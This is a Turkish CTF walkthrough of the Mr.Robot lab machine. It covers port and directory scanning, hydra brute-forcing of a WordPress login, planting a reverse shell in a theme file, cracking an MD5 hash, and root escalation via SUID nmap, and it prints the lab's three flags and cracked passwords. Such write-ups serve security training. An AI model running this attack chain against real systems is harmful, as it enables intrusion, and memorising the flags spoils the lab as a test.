# Mr.Robot CTF

## 1.Adım Ping Taraması
Hedef makinenin erişilebilir olup olmadığını kontrol etmek için bir ping taraması
```bash
ping Machine_IP
```
## 2.Adım Nmap Taraması
Nmap ile hedef IP üzerinde port ve versiyon taraması gerçekleştirdik:
```bash
nmap --top-ports 100 -sV 10.10.63.57
```
Nmap Sonucu :
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-04 11:59 EDT
Nmap scan report for 10.10.63.57
Host is up (0.073s latency).
Not shown: 97 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.04 seconds
```
## 3.Adım Gobuster Taraması
Gobuster ile hedef IP üzerinde dizin taraması gerçekleştirdik:
```bash
gobuster dir -u 10.10.63.57 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```
Gobuster Sonucu :
```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.63.57
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 213]
/.htaccess            (Status: 403) [Size: 218]
/.htpasswd            (Status: 403) [Size: 218]
/0                    (Status: 301) [Size: 0] [--> http://10.10.63.57/0/]
/Image                (Status: 301) [Size: 0] [--> http://10.10.63.57/Image/]
/admin                (Status: 301) [Size: 233] [--> http://10.10.63.57/admin/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.63.57/feed/atom/]
/audio                (Status: 301) [Size: 233] [--> http://10.10.63.57/audio/]
/blog                 (Status: 301) [Size: 232] [--> http://10.10.63.57/blog/]
/css                  (Status: 301) [Size: 231] [--> http://10.10.63.57/css/]
/dashboard            (Status: 302) [Size: 0] [--> http://10.10.63.57/wp-admin/]
/favicon.ico          (Status: 200) [Size: 0]
/feed                 (Status: 301) [Size: 0] [--> http://10.10.63.57/feed/]
/images               (Status: 301) [Size: 234] [--> http://10.10.63.57/images/]
/image                (Status: 301) [Size: 0] [--> http://10.10.63.57/image/]
/index.html           (Status: 200) [Size: 1188]
/index.php            (Status: 301) [Size: 0] [--> http://10.10.63.57/]
/intro                (Status: 200) [Size: 516314]
/js                   (Status: 301) [Size: 230] [--> http://10.10.63.57/js/]
/license              (Status: 200) [Size: 309]
/login                (Status: 302) [Size: 0] [--> http://10.10.63.57/wp-login.php]
/page1                (Status: 301) [Size: 0] [--> http://10.10.63.57/]
/phpmyadmin           (Status: 403) [Size: 94]
/rdf                  (Status: 301) [Size: 0] [--> http://10.10.63.57/feed/rdf/]
/readme               (Status: 200) [Size: 64]
/render/https://www.google.com (Status: 301) [Size: 0] [--> http://10.10.63.57/render/https:/www.google.com]                                                                                              
/robots               (Status: 200) [Size: 41]
/robots.txt           (Status: 200) [Size: 41]
/rss                  (Status: 301) [Size: 0] [--> http://10.10.63.57/feed/]
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.63.57/feed/]
/sitemap              (Status: 200) [Size: 0]
/sitemap.xml          (Status: 200) [Size: 0]
/video                (Status: 301) [Size: 233] [--> http://10.10.63.57/video/]
/wp-admin             (Status: 301) [Size: 236] [--> http://10.10.63.57/wp-admin/]
/wp-content           (Status: 301) [Size: 238] [--> http://10.10.63.57/wp-content/]
/wp-config            (Status: 200) [Size: 0]
/wp-includes          (Status: 301) [Size: 239] [--> http://10.10.63.57/wp-includes/]
/wp-cron              (Status: 200) [Size: 0]
/wp-load              (Status: 200) [Size: 0]
/wp-links-opml        (Status: 200) [Size: 227]
/wp-mail              (Status: 500) [Size: 3064]
/wp-login             (Status: 200) [Size: 2599]
/wp-settings          (Status: 500) [Size: 0]
/wp-signup            (Status: 302) [Size: 0] [--> http://10.10.63.57/wp-login.php?action=register]
/xmlrpc.php           (Status: 405) [Size: 42]
/xmlrpc               (Status: 405) [Size: 42]
Progress: 4734 / 4735 (99.98%)
===============================================================
Finished
===============================================================
```
## 4.Adım robots.txt Dosyasını İnceleme
Robots.txt dizinine giderek aşağıdaki dosyaları bulduk:
```bash
http://Machine_IP/robots.txt
```
```bash
User-agent: *
fsocity.dic
key-1-of-3.txt
```
## 5.Adım İlk Flag
Aşağıdaki URL'ye giderek ilk flag'i bulduk:
```bash
http://Machine_IP/key-1-of-3.txt
```
Flag1:
```bash
073403c8a58a1f80d943455fb30724b9
```
## 6.Adım fsocity.dic Dosyası
Aşağıdaki URL'ye gidildiğinde bir wordlist indiriliyor:
```bash
http://Machine_IP/fsocity.dic
```
İndirilen wordliste baktığımızda tekrar eden değerler görüyoruz. Wordliste aşağıdaki işlemleri yaparak daha kısa bir wordlist elde ediyoruz.
```bash
sort fsocity.dic | uniq > fsocity-uniq.txt
```
## 7.Adım Bruteforce
Gobuster ile bulduğumuz /wp-login sayfasına hydra aracı ile bruteforce atarak username ile şifreyi buluyoruz. 

İlk olarak kullanıcı adını bulmak için:
```bash
hydra -L fsocity-uniq.txt -p 1234 Machine_IP http-post-form "/wp-login.php:log=^USER^&pwd=1234&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.13.252%2Fwp-admin%2F&testcookie=1:Invalid username" -t 30  
```
Sonuç :
```bash
[80][http-post-form] host: Machine_IP   login: elliot   password: 1234
```
İkinci olarak şifreyi bulmak için :
```bash
hydra -l elliot -P fsocity-uniq.txt Machine_IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:S=The password" -t 30
```
Sonuç :
```bash
[80][http-post-form] host: Machine_IP   login: elliot   password: ER28-0652
```
## 8.Adım Wordpress Üzerinden Shell Erişimi
Wordpress'e giriş yaptıktan sonra, Appearance editörde reverse shell kodu yükleyebildiğimizi görüyoruz. 404.php dosyasına reverse shell kodlarını ekleyip güncelledik. Netcat dinlemesi başlattık ve ilgili sayfaya gidiyoruz:
Netcat dinlemesi :
```bash
nc -nvlp 1234
```
İlgili sayfaya gidiyoruz :
```bash
http://Machine_IP/wp-content/twentyfifteen/404.php
```
Shell erişimi sağlıyoruz :
`/home/robot` dizinine gidip flag'i okumaya çalıştık. Ancak, `key-2-of-3.txt` dosyasına erişemedik. `password.raw-md5` dosyasını okuduktan sonra hash'ini kırarak robot kullanıcısının parolasını bulduk:
```bash
$ pwd
/home/robot
$ ls
key-2-of-3.txt
password.raw-md5
$ cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```
`c3fcd3d76192e4007dfb496cca67e13b` hashini kırıyoruz ve şifreyi elde ediyoruz : `abcdefghijklmnopqrstuvwxyz
`
su robot yapinca hata aliyoruz o yuzden python ile interaktif terminal aciyoruz ve 2. flagi buluyoruz :
```bash
$ su robot
su: must be run from a terminal
$ python -c 'import pty; pty.spawn("/bin/sh")'
$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
```
Flag2 :
```bash
822c73956184f694993bede3eb39f959
```
## 9.Adım SUID Dosyaları
Root erişimi sağlamak için aşağıdaki komutu kullanarak SUID dosyalarını taradık:
```bash
find / -perm -u=s -type f 2>/dev/null
```
Sonuç : 
```bash
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```
## 10.Adım Nmap ile Root Erişimi
Aşağıdaki komut ile nmap aracılığıyla root erişimi sağladık ve 3. flagi buluyoruz:
```bash
nmap --interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
# cd /root
# ls
firstboot_done  key-3-of-3.txt
# cat key-3-of-3.txt
```
Flag3 :
```bash
04787ddef27c3dee1ee161b21670b4e4
```







